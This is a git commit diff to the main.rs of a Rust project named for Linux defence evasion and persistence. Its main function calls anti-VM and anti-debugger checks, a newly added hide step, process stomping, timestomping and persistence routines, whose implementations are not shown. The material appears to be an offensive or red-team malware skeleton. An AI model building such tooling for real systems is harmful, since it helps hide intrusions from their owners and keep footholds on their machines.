7266cc91d9f1f6cddc6d1dc27a38ca47eb7a4bc3
Severus Snape <144463175+0x00snape@users.noreply.github.com>
2025-04-28 12:08:26 +0545

    Update main.rs

--- Defence-Evasion-and-Persistence-linux/src/main.rs
+++ Defence-Evasion-and-Persistence-linux/src/main.rs
@@ -1,17 +1,15 @@
 mod module;
-use module::{check_vm, check_debugger, time_stomp, process_stomp, persistance};
+use module::{check_debugger, check_vm, hide, persistence, process_stomp, time_stomp};
 
 fn main() {
-   
+    
     check_vm();
-    check_debugger(); 
-    time_stomp();
+    check_debugger();
+    hide();
     process_stomp();
-    persistance();
+    time_stomp(); 
+    persistence();
 
     std::thread::sleep(std::time::Duration::from_secs(10));
     std::process::exit(0);
 }
-
-
-
